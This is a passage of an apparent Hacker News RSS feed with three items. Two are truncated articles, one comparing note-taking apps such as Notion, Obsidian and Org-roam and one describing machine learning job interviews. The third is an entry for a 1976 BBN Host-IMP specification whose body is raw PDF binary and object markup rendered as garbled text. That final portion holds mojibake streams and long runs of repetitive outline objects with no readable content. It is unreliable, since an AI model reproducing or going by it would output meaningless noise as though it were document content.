personal devotional notes. From there I could dive into individual topics such as love or the kingdom of God.</p><p>At least, that's how I hope it will work in practice. Again, I'm just getting started</p><p>It seems that with the release of Roam Research, there have now been a plethora of tools in development that work off of the idea of backlinks, as well as atomic thoughts. I've done a lot of research in the last week, and have formed some opinions about some. Let's start first with the note-taking app I'm coming from:</p><h2>Notion</h2><p><a href="https://www.notion.so/">Notion</a> seemed to take off in 2018-2019 as the premiere note-taking app. Indeed, Notion has introduced backlinks in a recent release.</p><p>I like Notion, and will both keep paying for it and taking notes there. It has a lot of power in organizing and reorganizing notes, as well as pulling in other content such as code, videos, images, etc. It even goes so far as to include database-like tables and Kanban-style boards.</p><p>Backlinks in Notion seem to primarily work at the "page" level, rather than the block//heading level like Roam Research. And while I love Notion as a clean interface for notes, I'm not wild about its lack of capabilities in making TODOs and alerts and finding notes after the fact. Its search is great but basic.</p><h2>Roam Research</h2><p><a href="https://roamresearch.com/">Roam Research</a> seems like a really powerful system, particularly for a research-style Zettelkasten. I honestly have not tried it, both because I didn't get into the trial, but now because of the cost and the concern of people losing notes and the lack of good backups. Most of the posts I've seen about note stability have disappeared, but you can see one graveyard here: <a href="https://www.reddit.com/r/RoamResearch/comments/hsrg0z/lost_all_my_notes_need_recommendations_for/">https://www.reddit.com/r/RoamResearch/comments/hsrg0z/lost_all_my_notes_need_recommendations_for/</a>. There was even a post today about it: <a href="https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/">https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/</a></p><p>Frankly, I prefer open source and being in control of my own content and notes. I know Notion doesn't fit into that well, but it also seemed ahead of its time to me.</p><h2>TiddlyWiki</h2><p><a href="https://tiddlywiki.com/">TiddlyWiki</a> has been around a while and was the note system I used before Notion. TiddlyWiki is many things, but at its heart, it was a single file HTML that you could download and make changes to in wiki syntax. TiddlyWiki has had backlinks for a while, possibly even before Roam Research, but recently the community has released some versions specifically for backlinking: <a href="https://akhater.github.io/drift/">Drift</a> and <a href="https://kebifurai.github.io/TiddlyResearch/">Tiddly Research</a> are two that I've tried out.</p><p>They're great, but there are a few problems that I've had with TiddlyWiki that just make me hesitant. I had a lot of notes in it as I was working in Seminary, wrote a custom Bible linking plugin, etc, but updating it was a nightmare on the node version with my customization. For each upgrade, I'd have to manually diff my plugin changes against the upgrades. Of course, this may have just been me not knowing what I was doing, but it still wasn't fun. Also, just the speed of entering notes and using the mouse doesn't appeal to me. Being a Vim guy, I like my keyboard.</p><h2>Obsidian</h2><p><a href="https://obsidian.md/">Obsidian</a> is a recent and gorgeous option for note-taking. It was actually my first introduction to backlinking and this whole area of decentralized notes. It's a commercial-style app (more on that below), but also works off of just a directory of markdown files. So you get to keep your content regardless. It feels great to use, I like its editor (not as well as <a href="https://typora.io/">Typora</a> or Notion though), and it's fast, responsive, and the keyboard shortcuts are great. It even has a basic Vim mode.</p><p>My only hangups are: if you use it for commercial purposes, the license becomes a pay-as-you-go SAAS license. The free license is just for personal use. Also, it's not open source, so there's always the risk that the company could go under and disappear, or worse, that they start charging way after I'm invested in it. Sure, they're just markdown files...I could make my own note-taking app if that were the case...but I don't have that much time or interest. Also, the backlinks seem to just be at the note level, but I didn't mind that as much in this app.</p><p>Still, if you're looking for a personal note-taking app that's easy to get into, supports backlinks, has the graph, uses markdown, is modern-looking, and is nice to use, totally give Obsidian a try.</p><h2>Joplin</h2><p><a href="https://joplinapp.org/">Joplin</a> is one that I've just tried a little bit. It looks fine as far as an editor, has nice backlinking, etc. The one hangup that made me put it down quickly is that links are always based on note ID, so you have to find a note to get its ID and insert it. It didn't seem nearly as fast or practical as I wanted. It is open source though, and worth a look.</p><h2>Trilium</h2><p><a href="https://github.com/zadam/trilium">Trilium</a> is an app I see recommended often. It's also free and open source. It claims to have automatic markdown conversion, but I couldn't get it to work. I gave up pretty soon after that.</p><h2>Zim</h2><p><a href="https://zim-wiki.org/">Zim</a> is a desktop wiki that I've used quite a lot in the past. It also has a backlinks plugin. It works great, is open source as well, and is very quick for taking notes. The negatives for this one are that it looks old and that it uses a custom wiki syntax that I don't like as well as markdown or Org.</p><h2>MindForger</h2><p><a href="https://www.mindforger.com/">MindForger</a> kind of does its own thing. It's difficult to explain, but worth checking out. It kind of has backlinks in that it has notes that are related to each other, but in more of an AI/intuitive way than in a manual way. It takes the headlines of Markdown files and makes them notes, but for each note lets you embed other top headlines/etc. It's weird but worth checking out. For a great intro, watch the video at <a href="https://www.youtube.com/watch?v=PlW2e1X3O-I">https://www.youtube.com/watch?v=PlW2e1X3O-I</a>.</p><p>MindForger is open source and seems really powerful. I'm going to keep playing with it. The only negative is that it's got the whole split-screen preview/markdown editor like many of the others on this list, but there's no graphical component to the editor at all. The keyboard shortcuts are multi-key and not configurable as well, but they're intuitive.</p><h2>Foam</h2><p><a href="https://foambubble.github.io/foam/">Foam</a> is a plugin to Visual Studio code that emulates many features from Roam/Obsidian. It has backlinks, a graph, and looks decent.</p><p>Honestly, though, I don't like Visual Studio code, it's not the greatest editing experience, and the backlinks seem majorly delayed from saving. But maybe that was just my experience. This is one that has a lot of promise and I would keep my eye on in the future, but seems it has a little ways to go.</p><p>I'll give an honorable mention to <a href="https://github.com/dendronhq/dendron">Dendron</a>, which seems to be at least on par with Foam. It also has a hierarchical system but seems to keep all of the files in the same directory using a dot-separated notation. Also worth checking out and watching, but also had delayed backlink processing and note a great markdown editing experience.</p><h2>Org-roam</h2><p><a href="https://www.orgroam.com/">Org-roam</a> is where I landed for now. Org-roam is an extension of the famous <a href="https://orgmode.org/">Org Mode</a> for Emacs. I used Org Mode a LOT when I was new to Emacs. It's really crazy how deep the rabbit hole goes for Org Mode. Org Mode is best described as an outliner, journal, day planner, calendar, TODO list, kanban board, interactive coding tool, TODO capture tool (including linking to source code lines, a browser, or even against a pdf as you're reading it), and presentation software. I'm sure there are a dozen or two things I'm missing too.</p><p>I'll caveat this though...you have to be a little crazy to use org-mode. Configuring it alone can be a trial in insanity, but once you master ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jself.net/posts/note-taking/">https://jself.net/posts/note-taking/</a></em></p>]]>
            </description>
            <link>https://jself.net/posts/note-taking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949421</guid>
            <pubDate>Sat, 31 Oct 2020 05:52:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What You Can Expect in Machine Learning Interviews]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949145">thread link</a>) | @nutellalover
<br/>
October 30, 2020 | https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews | <a href="https://web.archive.org/web/*/https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.19.2"><div dir="ltr"><div><div id="viewer-3rikt"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews" data-pin-media="https://static.wixstatic.com/media/4feadc_7a6668848e7246daa3e922d0aecdf505~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/4feadc_7a6668848e7246daa3e922d0aecdf505~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-7qfct">It's no surprise that machine learning jobs today are among the hottest on the market. <a href="https://artificialintelligence-news.com/2019/03/15/machine-learning-jobs-high-paying-demand/" target="_blank" rel="noopener"><u>Recent studies</u></a> have shown that the position of <strong>machine learning engineer </strong>commands one of the highest base salaries among surveyed jobs and has seen a 344% increase in number of postings from 2015-2018!</p><p id="viewer-403m8">So these jobs are clearly in high demand. But what does it take to secure one of these highly sought-after positions? Like any job in technology, machine learning positions require candidates to go through a rigorous series of technical interviews. </p><p id="viewer-43gc5">What is the structure of these interviews? What topics are covered? Are these interviews similar to software engineering? (Spoiler: sorta, kinda) Who is paying for lunch? </p><p id="viewer-781mt">There are a lot of questions, but not a lot of answers out there. This is largely because the field of machine learning is still young and learning to stand on its own two feet. </p><p id="viewer-cemkd">This article is intended to be the missing guide for what to expect in a machine learning interview. The observations in this post are born out of collective experiences interviewing for machine learning engineer and scientist positions, comprising over 90 hours of interview time across 80+ interviews at big (FAANG) companies, small (just out of Y-Combinator) companies, and everything in-between.</p><p id="viewer-522i9">Let's get started.</p><h3 id="viewer-32gml"><strong>Machine learning interviews are diverse...sometimes</strong></h3><p id="viewer-ecirs">The machine learning landscape is constantly evolving. If you were entering the world of machine learning ~4 years ago, the most in-demand skill would be the ability to build and debug deep learning models. Today with the rise of tools like PyTorch and Tensorflow, a bigger issue is not so much how to build machine learning prototypes but rather how to take them all the way to a deployed system in production (also called the last-mile problem). </p><p id="viewer-63ac7">What this means is that over the course of several years of interviewing for these positions, we've learned that the nature of these assessments can be incredibly diverse. For example, the following are examples of real interview types/questions that we've had:</p><p id="viewer-ac86k">	1) Read a recent paper on unsupervised learning for noise reduction and whiteboard extensions to the techniques proposed in the paper</p><p id="viewer-aj8c3">	2) Explain the nodes in the Tensorflow computational graph for a feedforward layer of a neural network</p><p id="viewer-5lue8">	3) Give an hour-long talk about some machine learning project you have done and get grilled on its details</p><p id="viewer-4bjvl">	4)  Describe how you would implement Google's autocomplete </p><p id="viewer-2p8og">	5) Explain why L1 regularization encourages sparsity in features</p><p id="viewer-5hjhh">Sound like these questions are all over the place? Don't get overwhelmed: they are.</p><p id="viewer-53d1i">Does that mean you will have to know how to do all of the above for your interview? No, definitely not. This variety is only meant to illustrate that many things are fair game depending on the company you are applying to and what they expect your responsibilities will be. </p><p id="viewer-3hihv">For example, if you are applying to a more research-intensive machine learning position, you may be asked to explain research-caliber work (either yours or that of others). Or if you are going to be a machine learning engineer at a young company, you may have to be more familiar with the internals of a framework or technology stack that is in high-demand. It really depends.</p><p id="viewer-7annu">That being said, as the field has matured, we've seen that the responsibilities of these positions are getting more well-defined leading to more standardized assessment structures.</p><p id="viewer-ciu37">Nowadays for most machine learning engineer positions, you can expect your interview journey to look something like the following:</p><ul><li id="viewer-6irq6"><p>First screening call with a recruiter</p></li><li id="viewer-edt1j"><p>Technical phone interview covering some software engineering and machine learning theory</p></li><li id="viewer-e1103"><p>Onsite (~4-5 interviews)</p></li></ul><p id="viewer-esrfv">                - Software engineering principles (~2 interviews)</p><p id="viewer-62fec">                - Machine learning theory (~1 interviews)</p><p id="viewer-2ugbd">                - Machine learning system design (~1-2 interviews)</p><p id="viewer-es0je">                - Interview with management (cultural fit check, typical in startups)</p><p id="viewer-73jhi">This can be subject to change depending on the company, but we've largely seen that common format across interviews today. Now let's discuss what to expect in terms of specific skills being evaluated.</p><h3 id="viewer-avlia"><strong>Know your machine learning theory</strong></h3><p id="viewer-dob3m">When applying for machine learning jobs you will always be asked about machine learning theory. In a sense, this a "well duh" moment but the <a href="http://www.cs.cmu.edu/~tom/mlbook.html" target="_blank" rel="noopener"><u>machine learning</u></a> <a href="https://web.stanford.edu/~hastie/ElemStatLearn/" target="_blank" rel="noopener"><u>theory</u></a> <a href="https://www.microsoft.com/en-us/research/people/cmbishop/prml-book/" target="_blank" rel="noopener"><u>literature</u></a> is vast so knowing what to focus on rather than working through multiple 1000-page textbooks is the key question.</p><p id="viewer-et0di"> Conceptual questions are asked in one of two forms: 1) in the context of some larger problem (i.e. while describing a system design, discuss model tradeoffs) or 2) in isolation (i.e. spend 30+ minutes describing how your favorite supervised learning algorithm works).</p><p id="viewer-t28k">In either case, the types of questions and concepts you'll be asked about stay pretty consistent. Our survey of past machine learning interviews has shown that you will tend to be tested on topics such as the following:</p><p id="viewer-5srhm">	1) What is the bias-variance tradeoff?</p><p id="viewer-fo0au">	2) What is overfitting/underfitting and how do you know when your model is suffering from those issues?</p><p id="viewer-bg784">	3) How do you evaluate model performance (which metrics are used and why)?</p><p id="viewer-b17gt">	4) Can you explain how some classical machine learning models work (logistic regression, k-nearest neighbors, support vector machines, decision trees, etc.)?</p><p id="viewer-2o3la">	5) What are common techniques for unsupervised learning?</p><p id="viewer-3sb7r">	6) How do you pick the best features for your model?</p><p id="viewer-b7b5m">That being said, because the collection of potential theory topics is so large, we've distilled the key concepts seen in interviews into a <a href="https://www.confetti.ai/assets/ml-primer/ml_primer.pdf" target="_blank" rel="noopener"><u>primer with practice exercises</u></a>. </p><h3 id="viewer-537k4"><strong>Software engineering is still important</strong></h3><p id="viewer-8v5gq">While the focus of machine learning jobs isn't just software engineering, you should still expect to be asked some more traditional coding and algorithms questions. These questions will be very similar, if not identical, to those you would be asked in a standard engineering interview. </p><p id="viewer-27v4b">Although this may seem unrelated to what you would think a machine learning practitioner does, when you are on the job knowing <em>how</em> to theoretically build a model is not the same as doing the actual building. This is true whether or not you are applying to be a machine learning scientist or a machine learning engineer. You need to be proficient in coding, debugging, and thinking through algorithms exercises. As an example of topics you can expect to be asked about:</p><p id="viewer-eal72">	1) Recursion and memoization (you'll basically never use recursion in the real world but 		   it's often used to evaluate your ability to think through an algorithm)</p><p id="viewer-cmind">	2) Memory and run-time complexity analysis</p><p id="viewer-d4m4q">	3) Standard data structures like trees, linked lists, hash maps, and general graphs</p><p id="viewer-9rse9">That being said, the standards for coding may not be the same in your interviews as they would be of someone applying for a pure software development position. In other words your engineering abilities might not need to be as sophisticated, especially if you are just coming out of an advanced graduate degree program in machine learning where your focus was more on pushing state-of-the-art rather than building robust training pipelines. </p><p id="viewer-dkeon">For software engineering, there are a number of popular <a href="http://www.crackingthecodinginterview.com/" target="_blank" rel="noopener"><u>books</u></a> and <a href="https://leetcode.com/" target="_blank" rel="noopener"><u>services</u></a> that can help you practice these skills.</p><h3 id="viewer-76m1h"><strong>Know how to build machine learning systems</strong></h3><p id="viewer-ba220">Knowing how to architect machine learning systems is one of the most important skills you can have going into the field of machine learning. One of the big aspects of machine learning's evolution in the past 1-2 years is that companies are going all-in on integrating data-driven solutions to extract business value across their teams. At scale this can lead to <a href="https://www.kdd.org/kdd2019/accepted-papers/view/150-successful-machine-learning-models-6-lessons-learned-at-booking.com" target="_blank" rel="noopener"><u>tremendous improvements</u></a> in the quality of a service. </p><p id="viewer-2j318">When you are being brought into a team as a machine learning expert, the expectation is that you will be able to apply machine learning skills to improve some existing manual process. Oftentimes you will be presented with very vague problem descriptions (e.g. "I want these recommendations to be better") and you will have to break down and frame the problem in a form where machine learning is applicable.</p><p id="viewer-bj4et">This is the core of designing and architecting machine learning systems. This skill is among the most crucial ones that companies look for when evaluating candidates. A system design interview will involve being presented with a case study (e.g. "we want a tool that can help us detect offensive content on our platform") and then talking through how to set up a machine learning pipeline that can address the problem. Along the way you will be assessed on your ability to:</p><p id="viewer-b3dv8">	1) Gather and validate datasets needed for your models</p><p id="viewer-3ctv5">	2) Build training infrastructure</p><p id="viewer-actbm">	3) Discuss the tradeoffs among potential modelling solutions</p><p id="viewer-7bofr">	4) Know what metrics you will track for model performance</p><p id="viewer-5tid6">	5) Interpret model predictions and do error analysis</p><p id="viewer-b2nej">	6) Architect a deployment solution (e.g. cloud-based, on-device, etc.)</p><p id="viewer-3hr9b">	7) Iterate on user feedback to improve the solution</p><p id="viewer-2fn8e">The important thing to recognize in these types of interviews is that there is never one "correct" answer. Your interviewers are more interested in knowing how you think through a problem. You will be asked to justify your decisions and also adapt them based on new situations (e.g. "now imagine we don't have enough money to gather 1 million annotated images...").</p><p id="viewer-2plnr">When preparing for these types of interviews, there's no substitute for real-world experience. Build projects so you witness firsthand what tradeoffs are necessary to consider. If that's not possible, spend a lot of time reading through company use-cases and learning how others have <a href="https://github.com/eugeneyan/applied-ml" target="_blank" rel="noopener"><u>solved similar problems</u></a>. </p><h3 id="viewer-44oq9"><strong>Technical interviews are just one signal</strong></h3><p id="viewer-dmrea">The last point worth mentioning is that while technical interviews are important signals in determining whether you get the job, they are still only one of many contributing signals. In particular, many startups also place great emphasis on your cultural fit ‚Ä¶</p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews">https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews</a></em></p>]]>
            </description>
            <link>https://www.blog.confetti.ai/post/what-you-can-expect-in-machine-learning-interviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949145</guid>
            <pubDate>Sat, 31 Oct 2020 04:30:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Specifications for the Interconnection of a Host and an IMP (1976) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949100">thread link</a>) | @tjalfi
<br/>
October 30, 2020 | https://walden-family.com/impcode/BBN1822_Jan1976.pdf | <a href="https://web.archive.org/web/*/https://walden-family.com/impcode/BBN1822_Jan1976.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>√®l√®[mxEB√∞c∆í√üg√û≈°‚Äû{
LÔøΩ√é‚Äö√´:√∏5T√ú√¢vu~e ¬≠√èww√£¬´Sr≈°√≠√≤;B¬•√ó6√æ√∫S√à√ù.$¬∏}‚Ä†¬°√ã1¬≠
‚Ä∫2=√â¬ø√ñ¬≥;qKÀú√ö%‚Ä†`
√¶`√Ä`,¬®:≈ΩkW‚Äò√° Àú0a√Çh¬¢I‚Ä∞‚Ä†√π'Ck¬±101\√¢√´√†d!√Ü√Ä√á√å√Ä¬¨ √¨√†√ãÀú√Å¬∫@¬¨!
‚Ñ¢:√çÀú√É¬∫‚Ä¶: √é√ÉX0J‚ÄòG√Ö2‚Äì¬∞ÔøΩ√π¬Ø∆í√Ä¬°√∏20¬∞‚Äöb`b2√∂\‚Äò
endstream
endobj
1237 0 obj
677 
endobj
1023 0 obj
&lt;&lt; 
/Contents 1232 0 R 
/Parent 1019 0 R 
/Resources &lt;&lt; /XObject &lt;&lt; /ImA 1235 0 R &gt;&gt; /ProcSet [ /PDF /ImageB ] &gt;&gt; 
/MediaBox [ 0 0 612 792 ] 
/Type /Page 
/CropBox [ 0 0 612 792 ] 
/Rotate 0 
&gt;&gt; 
endobj
1024 0 obj
&lt;&lt; 
/Count -207 
/Last 1025 0 R 
/First 1026 0 R 
&gt;&gt; 
endobj
1025 0 obj
&lt;&lt; 
/Prev 1231 0 R 
/Parent 1024 0 R 
/Dest [ 1014 0 R /Fit ] 
/Title (H-28)
&gt;&gt; 
endobj
1026 0 obj
&lt;&lt; 
/Next 1027 0 R 
/Parent 1024 0 R 
/Dest [ 1023 0 R /Fit ] 
/Title (0001)
&gt;&gt; 
endobj
1027 0 obj
&lt;&lt; 
/Next 1028 0 R 
/Prev 1026 0 R 
/Parent 1024 0 R 
/Dest [ 1 0 R /Fit ] 
/Title (0002)
&gt;&gt; 
endobj
1028 0 obj
&lt;&lt; 
/Next 1029 0 R 
/Prev 1027 0 R 
/Parent 1024 0 R 
/Dest [ 6 0 R /Fit ] 
/Title (0003)
&gt;&gt; 
endobj
1029 0 obj
&lt;&lt; 
/Next 1030 0 R 
/Prev 1028 0 R 
/Parent 1024 0 R 
/Dest [ 11 0 R /Fit ] 
/Title (001)
&gt;&gt; 
endobj
1030 0 obj
&lt;&lt; 
/Next 1031 0 R 
/Prev 1029 0 R 
/Parent 1024 0 R 
/Dest [ 16 0 R /Fit ] 
/Title (002)
&gt;&gt; 
endobj
1031 0 obj
&lt;&lt; 
/Next 1032 0 R 
/Prev 1030 0 R 
/Parent 1024 0 R 
/Dest [ 21 0 R /Fit ] 
/Title (003)
&gt;&gt; 
endobj
1032 0 obj
&lt;&lt; 
/Next 1033 0 R 
/Prev 1031 0 R 
/Parent 1024 0 R 
/Dest [ 26 0 R /Fit ] 
/Title (004)
&gt;&gt; 
endobj
1033 0 obj
&lt;&lt; 
/Next 1034 0 R 
/Prev 1032 0 R 
/Parent 1024 0 R 
/Dest [ 31 0 R /Fit ] 
/Title (005)
&gt;&gt; 
endobj
1034 0 obj
&lt;&lt; 
/Next 1035 0 R 
/Prev 1033 0 R 
/Parent 1024 0 R 
/Dest [ 36 0 R /Fit ] 
/Title (006)
&gt;&gt; 
endobj
1035 0 obj
&lt;&lt; 
/Next 1036 0 R 
/Prev 1034 0 R 
/Parent 1024 0 R 
/Dest [ 41 0 R /Fit ] 
/Title (007)
&gt;&gt; 
endobj
1036 0 obj
&lt;&lt; 
/Next 1037 0 R 
/Prev 1035 0 R 
/Parent 1024 0 R 
/Dest [ 46 0 R /Fit ] 
/Title (008)
&gt;&gt; 
endobj
1037 0 obj
&lt;&lt; 
/Next 1038 0 R 
/Prev 1036 0 R 
/Parent 1024 0 R 
/Dest [ 49 0 R /Fit ] 
/Title (1-01)
&gt;&gt; 
endobj
1038 0 obj
&lt;&lt; 
/Next 1039 0 R 
/Prev 1037 0 R 
/Parent 1024 0 R 
/Dest [ 54 0 R /Fit ] 
/Title (1-02)
&gt;&gt; 
endobj
1039 0 obj
&lt;&lt; 
/Next 1040 0 R 
/Prev 1038 0 R 
/Parent 1024 0 R 
/Dest [ 59 0 R /Fit ] 
/Title (1-03)
&gt;&gt; 
endobj
1040 0 obj
&lt;&lt; 
/Next 1041 0 R 
/Prev 1039 0 R 
/Parent 1024 0 R 
/Dest [ 64 0 R /Fit ] 
/Title (1-04)
&gt;&gt; 
endobj
1041 0 obj
&lt;&lt; 
/Next 1042 0 R 
/Prev 1040 0 R 
/Parent 1024 0 R 
/Dest [ 69 0 R /Fit ] 
/Title (1-05)
&gt;&gt; 
endobj
1042 0 obj
&lt;&lt; 
/Next 1043 0 R 
/Prev 1041 0 R 
/Parent 1024 0 R 
/Dest [ 74 0 R /Fit ] 
/Title (1-06)
&gt;&gt; 
endobj
1043 0 obj
&lt;&lt; 
/Next 1044 0 R 
/Prev 1042 0 R 
/Parent 1024 0 R 
/Dest [ 79 0 R /Fit ] 
/Title (1-07)
&gt;&gt; 
endobj
1044 0 obj
&lt;&lt; 
/Next 1045 0 R 
/Prev 1043 0 R 
/Parent 1024 0 R 
/Dest [ 84 0 R /Fit ] 
/Title (1-08)
&gt;&gt; 
endobj
1045 0 obj
&lt;&lt; 
/Next 1046 0 R 
/Prev 1044 0 R 
/Parent 1024 0 R 
/Dest [ 87 0 R /Fit ] 
/Title (2-01)
&gt;&gt; 
endobj
1046 0 obj
&lt;&lt; 
/Next 1047 0 R 
/Prev 1045 0 R 
/Parent 1024 0 R 
/Dest [ 92 0 R /Fit ] 
/Title (2-02)
&gt;&gt; 
endobj
1047 0 obj
&lt;&lt; 
/Next 1048 0 R 
/Prev 1046 0 R 
/Parent 1024 0 R 
/Dest [ 97 0 R /Fit ] 
/Title (2-03)
&gt;&gt; 
endobj
1048 0 obj
&lt;&lt; 
/Next 1049 0 R 
/Prev 1047 0 R 
/Parent 1024 0 R 
/Dest [ 102 0 R /Fit ] 
/Title (2-04)
&gt;&gt; 
endobj
1049 0 obj
&lt;&lt; 
/Next 1050 0 R 
/Prev 1048 0 R 
/Parent 1024 0 R 
/Dest [ 107 0 R /Fit ] 
/Title (2-05)
&gt;&gt; 
endobj
1050 0 obj
&lt;&lt; 
/Next 1051 0 R 
/Prev 1049 0 R 
/Parent 1024 0 R 
/Dest [ 112 0 R /Fit ] 
/Title (2-06)
&gt;&gt; 
endobj
1051 0 obj
&lt;&lt; 
/Next 1052 0 R 
/Prev 1050 0 R 
/Parent 1024 0 R 
/Dest [ 117 0 R /Fit ] 
/Title (2-07)
&gt;&gt; 
endobj
1052 0 obj
&lt;&lt; 
/Next 1053 0 R 
/Prev 1051 0 R 
/Parent 1024 0 R 
/Dest [ 122 0 R /Fit ] 
/Title (2-08)
&gt;&gt; 
endobj
1053 0 obj
&lt;&lt; 
/Next 1054 0 R 
/Prev 1052 0 R 
/Parent 1024 0 R 
/Dest [ 127 0 R /Fit ] 
/Title (2-09)
&gt;&gt; 
endobj
1054 0 obj
&lt;&lt; 
/Next 1055 0 R 
/Prev 1053 0 R 
/Parent 1024 0 R 
/Dest [ 132 0 R /Fit ] 
/Title (2-10)
&gt;&gt; 
endobj
1055 0 obj
&lt;&lt; 
/Next 1056 0 R 
/Prev 1054 0 R 
/Parent 1024 0 R 
/Dest [ 137 0 R /Fit ] 
/Title (2-11)
&gt;&gt; 
endobj
1056 0 obj
&lt;&lt; 
/Next 1057 0 R 
/Prev 1055 0 R 
/Parent 1024 0 R 
/Dest [ 142 0 R /Fit ] 
/Title (2-12)
&gt;&gt; 
endobj
1057 0 obj
&lt;&lt; 
/Next 1058 0 R 
/Prev 1056 0 R 
/Parent 1024 0 R 
/Dest [ 147 0 R /Fit ] 
/Title (2-13)
&gt;&gt; 
endobj
1058 0 obj
&lt;&lt; 
/Next 1059 0 R 
/Prev 1057 0 R 
/Parent 1024 0 R 
/Dest [ 152 0 R /Fit ] 
/Title (2-14)
&gt;&gt; 
endobj
1059 0 obj
&lt;&lt; 
/Next 1060 0 R 
/Prev 1058 0 R 
/Parent 1024 0 R 
/Dest [ 157 0 R /Fit ] 
/Title (3-01)
&gt;&gt; 
endobj
1060 0 obj
&lt;&lt; 
/Next 1061 0 R 
/Prev 1059 0 R 
/Parent 1024 0 R 
/Dest [ 162 0 R /Fit ] 
/Title (3-02)
&gt;&gt; 
endobj
1061 0 obj
&lt;&lt; 
/Next 1062 0 R 
/Prev 1060 0 R 
/Parent 1024 0 R 
/Dest [ 167 0 R /Fit ] 
/Title (3-03)
&gt;&gt; 
endobj
1062 0 obj
&lt;&lt; 
/Next 1063 0 R 
/Prev 1061 0 R 
/Parent 1024 0 R 
/Dest [ 172 0 R /Fit ] 
/Title (3-04)
&gt;&gt; 
endobj
1063 0 obj
&lt;&lt; 
/Next 1064 0 R 
/Prev 1062 0 R 
/Parent 1024 0 R 
/Dest [ 177 0 R /Fit ] 
/Title (3-05)
&gt;&gt; 
endobj
1064 0 obj
&lt;&lt; 
/Next 1065 0 R 
/Prev 1063 0 R 
/Parent 1024 0 R 
/Dest [ 182 0 R /Fit ] 
/Title (3-06)
&gt;&gt; 
endobj
1065 0 obj
&lt;&lt; 
/Next 1066 0 R 
/Prev 1064 0 R 
/Parent 1024 0 R 
/Dest [ 187 0 R /Fit ] 
/Title (3-07)
&gt;&gt; 
endobj
1066 0 obj
&lt;&lt; 
/Next 1067 0 R 
/Prev 1065 0 R 
/Parent 1024 0 R 
/Dest [ 192 0 R /Fit ] 
/Title (3-08)
&gt;&gt; 
endobj
1067 0 obj
&lt;&lt; 
/Next 1068 0 R 
/Prev 1066 0 R 
/Parent 1024 0 R 
/Dest [ 197 0 R /Fit ] 
/Title (3-09)
&gt;&gt; 
endobj
1068 0 obj
&lt;&lt; 
/Next 1069 0 R 
/Prev 1067 0 R 
/Parent 1024 0 R 
/Dest [ 202 0 R /Fit ] 
/Title (3-10)
&gt;&gt; 
endobj
1069 0 obj
&lt;&lt; 
/Next 1070 0 R 
/Prev 1068 0 R 
/Parent 1024 0 R 
/Dest [ 207 0 R /Fit ] 
/Title (3-11)
&gt;&gt; 
endobj
1070 0 obj
&lt;&lt; 
/Next 1071 0 R 
/Prev 1069 0 R 
/Parent 1024 0 R 
/Dest [ 212 0 R /Fit ] 
/Title (3-12)
&gt;&gt; 
endobj
1071 0 obj
&lt;&lt; 
/Next 1072 0 R 
/Prev 1070 0 R 
/Parent 1024 0 R 
/Dest [ 217 0 R /Fit ] 
/Title (3-13)
&gt;&gt; 
endobj
1072 0 obj
&lt;&lt; 
/Next 1073 0 R 
/Prev 1071 0 R 
/Parent 1024 0 R 
/Dest [ 222 0 R /Fit ] 
/Title (3-14)
&gt;&gt; 
endobj
1073 0 obj
&lt;&lt; 
/Next 1074 0 R 
/Prev 1072 0 R 
/Parent 1024 0 R 
/Dest [ 227 0 R /Fit ] 
/Title (3-15)
&gt;&gt; 
endobj
1074 0 obj
&lt;&lt; 
/Next 1075 0 R 
/Prev 1073 0 R 
/Parent 1024 0 R 
/Dest [ 232 0 R /Fit ] 
/Title (3-16)
&gt;&gt; 
endobj
1075 0 obj
&lt;&lt; 
/Next 1076 0 R 
/Prev 1074 0 R 
/Parent 1024 0 R 
/Dest [ 237 0 R /Fit ] 
/Title (3-17)
&gt;&gt; 
endobj
1076 0 obj
&lt;&lt; 
/Next 1077 0 R 
/Prev 1075 0 R 
/Parent 1024 0 R 
/Dest [ 242 0 R /Fit ] 
/Title (3-18)
&gt;&gt; 
endobj
1077 0 obj
&lt;&lt; 
/Next 1078 0 R 
/Prev 1076 0 R 
/Parent 1024 0 R 
/Dest [ 247 0 R /Fit ] 
/Title (3-19)
&gt;&gt; 
endobj
1078 0 obj
&lt;&lt; 
/Next 1079 0 R 
/Prev 1077 0 R 
/Parent 1024 0 R 
/Dest [ 252 0 R /Fit ] 
/Title (3-20)
&gt;&gt; 
endobj
1079 0 obj
&lt;&lt; 
/Next 1080 0 R 
/Prev 1078 0 R 
/Parent 1024 0 R 
/Dest [ 257 0 R /Fit ] 
/Title (3-21)
&gt;&gt; 
endobj
1080 0 obj
&lt;&lt; 
/Next 1081 0 R 
/Prev 1079 0 R 
/Parent 1024 0 R 
/Dest [ 262 0 R /Fit ] 
/Title (3-22)
&gt;&gt; 
endobj
1081 0 obj
&lt;&lt; 
/Next 1082 0 R 
/Prev 1080 0 R 
/Parent 1024 0 R 
/Dest [ 267 0 R /Fit ] 
/Title (3-23)
&gt;&gt; 
endobj
1082 0 obj
&lt;&lt; 
/Next 1083 0 R 
/Prev 1081 0 R 
/Parent 1024 0 R 
/Dest [ 272 0 R /Fit ] 
/Title (3-24)
&gt;&gt; 
endobj
